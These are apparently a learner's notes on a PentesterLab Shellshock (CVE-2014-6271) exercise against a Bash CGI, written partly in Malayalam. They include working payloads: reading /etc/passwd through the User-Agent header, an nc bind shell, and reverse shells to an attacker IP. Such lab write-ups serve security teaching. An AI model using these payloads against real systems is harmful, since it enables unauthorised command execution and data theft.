## Introduction
-->This course details the exploitation of the vulnerability CVE-2014-6271. This vulnerability impacts the Bourne Again Shell "Bash". Bash is not usually available through a web application but can be indirectly exposed through a Common Gateway Interface "CGI".

## Fingerprinting
-->By visiting the application with a proxy (Burp Suite or OWASP Zap), we can detect that multiple URL are accessed when the page is loaded:
-->To exploit "Shellshock", we need to find a way to "talk" to Bash. This implies finding a CGI that will use Bash. CGIs commonly use Python or Perl but it's not uncommon to find (on old servers), CGI written in Shell or even C.
-->==What is a CGI ? - In computing, Common Gateway Interface ( CGI) is an interface specification that enables web servers to execute an external program, typically to process user requests. Such programs are often written in a scripting language and are commonly referred to as CGI scripts, but they may include compiled programs.==

## How CGIs work?
-->When you call a CGI, the web server (Apache here) will start a new process and run the CGI. Here it will start a Bash process and run the CGI script.
-->`You can quickly test this by replacing the call to `uptime` by a call to `env` in the CGI. Then if you call this script with arbitrary header, you should see them in the page.`

## The vulnerability
-->Here, we are going to focus on the first version of the vulnerability but many more vulnerabilities in the same subpart of Bash have been found since: CVE-2014-6277, CVE-2014-6278, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187...
-->The source of the issue is that Bash can have internal function declaration in its environment variable. The first version of the vulnerability is related to the ability to run arbitrary commands after a function declaration.
-->First, we need to declare that the environment variable is a function using `()`. Then we will add an empty body for the function. Finally, we can start adding the command we want to run after the function declaration. More details can be found in the [following email on oss-sec](http://seclists.org/oss-sec/2014/q3/650)
-->If you remember what we said before, Apache uses environment variables to pass headers to the CGI. Since it's a Bash based CGI, we will be able to run arbitrary command by declaring an empty function and add a command after this declaration.

## Exploitation
-->This vulnerability can be exploited using a Proxy with a repeater mode (to be faster) or using `netcat`.
-->Multiple payloads can be used depending on what you want to achieve. You can start by reading arbitrary files by using the following payload :
```
-> $ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
```
-->This payload will read the content of the file `/etc/passwd` and echo it in the response.
-->`You will need to inspect the HTTP headers of the response to see the file's content.`
-->The following part of the payload`() { :;};` is used to create an empty function. Then the command one wish to execute can be added.

## Bind shell
-->If you want to run command, the easiest way is to bind a shell. Basically you will use `netcat` (or `nc`) to listen on a port and redirect input and output to `/bin/sh`.
```
-> $ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
```
-->`Here, the path to `netcat`/`nc` is given. On a real system, you will have to brute force it and it may not be installed.`
-->If the connection starts hanging, it's a really good sign, the CGI is waiting for you to connect. You can then connect to the bound port using:
```
$ nc vulnerable 9999
id
uid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab)
```
-->Bind shells suffer from a huge limitation: it's likely that a firewall between you and your victim will prevent you from connecting to the port you just bound. To bypass this, we are going to get the server to connect back to us.

## Reverse Shell
-->We want the server to connect back to us. To do so, we are first going to bind a port on our system. We want a port that the server is likely to have access to, the most common are 21 (FTP), 53 (DNS), 123 (NTP), 80 (HTTP) and 443 (HTTPs) as they are probably used to keep the system up-to-date and to perform every day operations.
-->We are going to bind the port 443 (You will need to run this command as `root` or using `sudo`) using the following command :
->`nc -l -p 443`
-->Now, we just need to adapt our payload to get the server to connect back to us on port 443 :
```
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
```
-->By going back to our initial `netcat`, we can now type commands locally and they will be ran on the compromised system :
```
nc -l -p 443
id
uid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab)
```

## Running a single command
-->If you are working on the online version, you will only run one command the `/usr/local/bin/score [UUID]` command. After you run the command, the response from the CGI to the web server will not contain two empty lines and will cause the server to send back a HTTP/500 error back to you. To make sure the attack was successful, you need to check on the pentesterlab.com website to see if the exercise is marked as score.

## Conclusion
-->This exercise showed you how to manually detect and exploit ShellShock to gain command execution. This kind of vulnerabilities is really interesting and often stays undetected for a long time as it's located deep inside the interaction between components. I hope you enjoyed learning with PentesterLab.

# video explanation
-->==Shellshock is a **vulnerability in the Bash shell**, a user interface that uses a command-line interface to access an operating systemâ€™s services. The current command Bash interpreter lets users execute commands on a computer. The vulnerability allows attackers to run malicious scripts in systems and servers, which compromises everything in it.==
-->churkathil paranjatl shellshock oru attacker in bash command execute chyan sahayikum ok
-->Ivide lab open aakumbol site il thane namuk site il use chyuna server and its kernal inte details kanikunund.ini burp open aaki page reload chyuka.apol namuk korach request kanan patum.athil suspecious aayitullathan /cgi-bin/status request
-->ee request inte response nokiyal kanan patum.ee response ile content aan page load chyumbol site il kanikunath
-->GET / (ie,root page)  ile js code ee /cgi-bin/status request inte response il ninum content fetch chynunund :
```
<script>
		function status() {
                $.getJSON("/cgi-bin/status", function (data) {           
		 $.each( data, function( key, val ) {
    			$('#infos').append ( "<li><b>"+key+"</b>: " + val + "</li>" );
  		});
  		});
                } 

		status();
              </script>
```
-->when exploiting a shellshock the first thing we need to do is target a cgi. we cant run shellshock on the root directory of the server. we need the cgi. bqs the issue is not inside the webserver but inside Bash
-->so ivide namuk cgi-bin/status enna oru requst und.so ath eduth repeater ilek viduka ok
-->The most obvious way to test for shellshock is to use a User-Agent, bqz the user-agent will be logged inside the webserver logs.so someone checking their logs will see that we tried to attack against thier webserver
-->so what we can do is just replace the user-agent value by the shellshock payload :
```
User-Agent: () { :;}; echo $(</etc/passwd)
```
-->so request il ingane koduth send chyumbol namuk response il passwd kitum
-->Now we want a shell on the sysytem.so what we are going to do is get the vulnerable server to connect back to us
-->for that we can use netcat :
->`nc -l -p 9999`   ipol namal listen chyunund.ini server namale connect chyikanam.
-->for that we need to modify user-agent :
```
User-Agent: () { :;}; /usr/bin/nc [our kali ip] 9999 -e /bin/bash
```
-->ingane koduth send adikumbol namal sredhichal kanam namuk repeater il respose kitunila.karanam namude netcat umayi server connect chyapettirikunu. 
-->ini namal listen chyuna terminalil poi ->id ennadichal namuk result kitum. means shell access kiti ok

-->NOTE : ivide video yil ivan chyunath real aayi netcat vech listen chyth chyunathan. but namal chyumbol ->nc -lvnp 9999  oke koduth chythal aakila.ath ee lab inte theory partil (Running a single command) parayunund.so namal ee lab complete aakan nc in pakaram nammude UUID vech send chyanam ie,
```
User-Agent: () { :;}; /usr/local/bin/score 66d1486a-6571-4069-a67b-c4a70a99798d
```
-->Ipol 500 Internal server error kanikum.ini lab il poi reload chythal lab completed enn kanikum ok